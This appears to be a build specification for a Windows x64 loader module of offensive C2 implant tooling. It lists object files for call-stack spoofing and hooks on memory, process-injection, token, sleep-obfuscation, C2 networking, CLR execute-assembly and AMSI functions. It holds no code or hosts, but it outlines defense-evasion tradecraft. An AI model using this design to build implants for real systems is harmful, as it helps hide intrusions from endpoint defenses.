x64:
    load "bin/pico.x64.o"
        make object +disco

    load "bin/hooks.x64.o"
        merge

    load "bin/spoof.x64.o"
        merge

    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    load "bin/cfg.x64.o"
        merge

    load "bin/cleanup.x64.o"
        merge

    load "bin/gate.x64.o"
        merge

    load "bin/gate_init.x64.o"
        merge

    exportfunc "setup_hooks"  "__tag_setup_hooks"
    exportfunc "setup_memory" "__tag_setup_memory"

    # ── KERNEL32 — Speicher ───────────────────────────────────────────────────
    addhook "KERNEL32$VirtualAlloc"              "_VirtualAlloc"
    addhook "KERNEL32$VirtualAllocEx"            "_VirtualAllocEx"
    addhook "KERNEL32$VirtualFree"               "_VirtualFree"
    addhook "KERNEL32$VirtualProtect"            "_VirtualProtect"
    addhook "KERNEL32$VirtualProtectEx"          "_VirtualProtectEx"
    addhook "KERNEL32$VirtualQuery"              "_VirtualQuery"
    addhook "KERNEL32$WriteProcessMemory"        "_WriteProcessMemory"
    addhook "KERNEL32$ReadProcessMemory"         "_ReadProcessMemory"
    addhook "KERNEL32$MapViewOfFile"             "_MapViewOfFile"
    addhook "KERNEL32$UnmapViewOfFile"           "_UnmapViewOfFile"
    addhook "KERNEL32$CreateFileMappingA"        "_CreateFileMappingA"

    # ── KERNEL32 — Thread / Process ───────────────────────────────────────────
    addhook "KERNEL32$CreateThread"              "_CreateThread"
    addhook "KERNEL32$CreateRemoteThread"        "_CreateRemoteThread"
    addhook "KERNEL32$OpenProcess"               "_OpenProcess"
    addhook "KERNEL32$OpenThread"                "_OpenThread"
    addhook "KERNEL32$ResumeThread"              "_ResumeThread"
    addhook "KERNEL32$SuspendThread"             "_SuspendThread"
    addhook "KERNEL32$TerminateThread"           "_TerminateThread"
    addhook "KERNEL32$SetThreadContext"          "_SetThreadContext"
    addhook "KERNEL32$GetThreadContext"          "_GetThreadContext"
    addhook "KERNEL32$TerminateProcess"          "_TerminateProcess"
    addhook "KERNEL32$DuplicateHandle"           "_DuplicateHandle"
    addhook "KERNEL32$CreateProcessW"            "_CreateProcessW"
    addhook "KERNEL32$CreateToolhelp32Snapshot"  "_CreateToolhelp32Snapshot"
    addhook "KERNEL32$Process32FirstW"           "_Process32FirstW"
    addhook "KERNEL32$Process32NextW"            "_Process32NextW"
    addhook "KERNEL32$Sleep"                    "_Sleep"

    # ── KERNEL32 — Sync / Wait / APC ──────────────────────────────────────────────
    addhook "KERNEL32$WaitForSingleObject"        "_WaitForSingleObject"
    addhook "KERNEL32$QueueUserAPC"               "_QueueUserAPC"
    addhook "KERNEL32$CreateEventA"               "_CreateEventA"
    addhook "KERNEL32$SetEvent"                   "_SetEvent"

    # ── KERNEL32 — Allgemein ──────────────────────────────────────────────────
    addhook "KERNEL32$LoadLibraryA"              "_LoadLibraryA"
    addhook "KERNEL32$LoadLibraryW"              "_LoadLibraryW"
    addhook "KERNEL32$GetProcAddress"            "_GetProcAddress"
    addhook "KERNEL32$FreeLibrary"               "_FreeLibrary"
    addhook "KERNEL32$CloseHandle"               "_CloseHandle"
    addhook "KERNEL32$ExitThread"                "_ExitThread"
    addhook "KERNEL32$WriteFile"                 "_WriteFile"
    addhook "KERNEL32$ReadFile"                  "_ReadFile"
    addhook "KERNEL32$GetModuleHandleA"          "_GetModuleHandleA"

    # ── ADVAPI32 — Token / Privileges ────────────────────────────────────────
    addhook "ADVAPI32$OpenProcessToken"          "_OpenProcessToken"
    addhook "ADVAPI32$OpenThreadToken"           "_OpenThreadToken"
    addhook "ADVAPI32$GetTokenInformation"       "_GetTokenInformation"
    addhook "ADVAPI32$AdjustTokenPrivileges"     "_AdjustTokenPrivileges"
    addhook "ADVAPI32$SetThreadToken"            "_SetThreadToken"
    addhook "ADVAPI32$RevertToSelf"              "_RevertToSelf"
    addhook "ADVAPI32$LogonUserW"                "_LogonUserW"
    addhook "ADVAPI32$CreateProcessWithTokenW"   "_CreateProcessWithTokenW"
    addhook "ADVAPI32$CreateProcessWithLogonW"   "_CreateProcessWithLogonW"
    addhook "ADVAPI32$LookupPrivilegeValueA"     "_LookupPrivilegeValueA"
    addhook "ADVAPI32$SystemFunction032"         "_SystemFunction032"

    # ── KERNEL32 — Fiber (Foliage Sleep) ─────────────────────────────────────
    addhook "KERNEL32$ConvertThreadToFiberEx"    "_ConvertThreadToFiberEx"
    addhook "KERNEL32$ConvertFiberToThread"      "_ConvertFiberToThread"
    addhook "KERNEL32$SwitchToFiber"             "_SwitchToFiber"
    addhook "KERNEL32$CreateFiberEx"             "_CreateFiberEx"

    # ── WINHTTP — C2 Kommunikation ────────────────────────────────────────────
    addhook "WINHTTP$WinHttpOpen"                "_WinHttpOpen"
    addhook "WINHTTP$WinHttpConnect"             "_WinHttpConnect"
    addhook "WINHTTP$WinHttpOpenRequest"         "_WinHttpOpenRequest"
    addhook "WINHTTP$WinHttpSetOption"           "_WinHttpSetOption"
    addhook "WINHTTP$WinHttpAddRequestHeaders"   "_WinHttpAddRequestHeaders"
    addhook "WINHTTP$WinHttpSendRequest"         "_WinHttpSendRequest"
    addhook "WINHTTP$WinHttpReceiveResponse"     "_WinHttpReceiveResponse"
    addhook "WINHTTP$WinHttpReadData"            "_WinHttpReadData"
    addhook "WINHTTP$WinHttpQueryHeaders"        "_WinHttpQueryHeaders"
    addhook "WINHTTP$WinHttpCloseHandle"         "_WinHttpCloseHandle"

    # ── WS2_32 ────────────────────────────────────────────────────────────────
    addhook "WS2_32$WSAStartup"                  "_WSAStartup"
    addhook "WS2_32$WSASocketA"                  "_WSASocketA"
    addhook "WS2_32$WSACleanup"                  "_WSACleanup"
    addhook "WS2_32$connect"                     "_connect"
    addhook "WS2_32$send"                        "_send"
    addhook "WS2_32$recv"                        "_recv"
    addhook "WS2_32$closesocket"                 "_closesocket"
    addhook "WS2_32$getaddrinfo"                 "_getaddrinfo"

    # ── MSCOREE — Execute-Assembly ────────────────────────────────────────────
    addhook "MSCOREE$CLRCreateInstance"          "_CLRCreateInstance"

    # ── OLEAUT32 — Execute-Assembly ───────────────────────────────────────────
    addhook "OLEAUT32$SafeArrayCreate"           "_SafeArrayCreate"
    addhook "OLEAUT32$SafeArrayCreateVector"     "_SafeArrayCreateVector"
    addhook "OLEAUT32$SafeArrayPutElement"       "_SafeArrayPutElement"
    addhook "OLEAUT32$SafeArrayDestroy"          "_SafeArrayDestroy"
    addhook "OLEAUT32$SysAllocString"            "_SysAllocString"

    # ── AMSI ──────────────────────────────────────────────────────────────────
    addhook "AMSI$AmsiScanBuffer"                "_AmsiScanBuffer"

    # ── OLE32 ─────────────────────────────────────────────────────────────────
    addhook "OLE32$CoCreateInstance"             "_CoCreateInstance"

    attach "KERNEL32$VirtualProtect" "_VirtualProtect"
    mergelib "../libtcg.x64.zip"

    export
